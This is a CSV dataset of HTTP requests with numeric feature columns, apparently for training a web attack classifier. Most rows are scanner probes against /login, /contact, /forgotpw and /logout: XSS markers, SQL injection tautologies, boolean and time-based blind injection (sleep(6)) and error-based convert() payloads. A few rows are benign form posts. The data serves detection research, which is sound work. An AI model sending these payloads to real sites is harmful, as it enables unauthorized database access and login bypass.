method,path,body,single_q,double_q,dashes,braces,spaces,badWords,type
GET,"/?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22)",,1,3,0,2,0,0,0
POST,/contact,address=3137%20Laguna%20Street&firstName=hdexrylf&lastName=fpjltfay&message=20&subject=na,0,0,0,0,2,0,0
POST,/contact,address=3137%20Laguna%20Street&firstName=yriykktp&lastName=dhhxxpew&message=20&subject=suggestions,0,0,0,0,2,0,0
POST,/contact,address=3137%20Laguna%20Street&firstName=ebvgdlfd&lastName=kdxfxjfg&message=20&subject=service,0,0,0,0,2,0,0
POST,/contact,address=3137%20Laguna%20Street&firstName=exndlqer&lastName=lccofase&message=20&subject=product,0,0,0,0,2,0,0
POST,"/contact?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22)",address=3137%20Laguna%20Street&firstName=exndlqer&lastName=lccofase&message=20&subject=product,1,3,0,2,2,0,0
POST,/forgotpw,"1'""",1,1,0,0,0,0,0
POST,/login,password=1'%22&username=admin,1,1,0,0,0,0,0
POST,/contact,address=1'%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=na,1,1,0,0,0,0,0
GET,/1'%22,,1,1,0,0,0,0,0
POST,/forgotpw,<forgot><username>e</username></forgot>' AND 2*3*8=6*8 AND 'Zai5'='Zai5,4,0,0,0,4,0,0
POST,/login,password=-1%20OR%202%2b433-433-1%3d0%2b0%2b0%2b1%20--%20&username=admin,0,0,1,0,4,0,0
POST,/contact,address=-1%20OR%202%2b937-937-1%3d0%2b0%2b0%2b1%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,0,0,1,0,4,0,0
GET,/logout'%20AND%202*3*8%3d6*8%20AND%20'1m8Y'%3d'1m8Y,,4,0,0,0,4,0,0
POST,/forgotpw,"<forgot><username>e</username></forgot>"" AND 2*3*8=6*8 AND ""H3fx""=""H3fx",0,4,0,0,4,0,0
POST,/login,password=-1%20OR%202%2b912-912-1%3d0%2b0%2b0%2b1&username=admin,0,0,0,0,2,0,0
POST,/contact,address=-1%20OR%202%2b694-694-1%3d0%2b0%2b0%2b1&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,0,0,0,0,2,0,0
GET,/logout%22%20AND%202*3*8%3d6*8%20AND%20%22VwGv%22%3d%22VwGv,,0,4,0,0,4,0,0
POST,/login,password=-1'%20OR%202%2b517-517-1%3d0%2b0%2b0%2b1%20--%20&username=admin,1,0,1,0,4,0,0
POST,/forgotpw,<forgot><username>e</username></forgot>%' AND 2*3*8=6*8 AND 'ZFWn'!='ZFWn%,4,0,0,0,4,0,0
POST,/login,password=%bf'%bf%22&username=admin,1,1,0,0,0,0,0
POST,/forgotpw,"'""",1,1,0,0,0,0,0
POST,/contact,address=-1'%20OR%202%2b795-795-1%3d0%2b0%2b0%2b1%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,1,0,1,0,4,0,0
GET,/logout%25'%20AND%202*3*8%3d6*8%20AND%20'wEX7'%21%3d'wEX7%25,,4,0,0,0,4,0,0
POST,/forgotpw,"''""""",2,2,0,0,0,0,0
POST,/login,password=%f0''%f0%22%22&username=admin,2,2,0,0,0,0,0
POST,/login,password=-1'%20OR%202%2b55-55-1%3d0%2b0%2b0%2b1%20or%20'csumCsFn'%3d'&username=admin,4,0,0,0,4,0,0
POST,/forgotpw,"if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'""XOR(if(now()=sysdate(),sleep(6),0))OR""*/",2,2,0,14,0,3,0
POST,/contact,address=%bf'%bf%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=na,1,1,0,0,0,0,0
GET,/%bf'%bf%22,,1,1,0,0,0,0,0
POST,/contact,address=-1'%20OR%202%2b516-516-1%3d0%2b0%2b0%2b1%20or%20'BYkreAIR'%3d'&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,4,0,0,0,4,0,0
GET,/,,0,0,0,0,0,6,0
GET,/if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/,,2,2,0,14,0,3,0
POST,/login,password=(select%20convert(int%2cCHAR(65)))&username=admin,0,0,0,3,1,1,0
POST,/contact,address=-1%22%20OR%202%2b170-170-1%3d0%2b0%2b0%2b1%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,0,1,1,0,4,0,0
POST,/forgotpw,"(select convert(int,CHAR(65)))",0,0,0,3,1,1,0
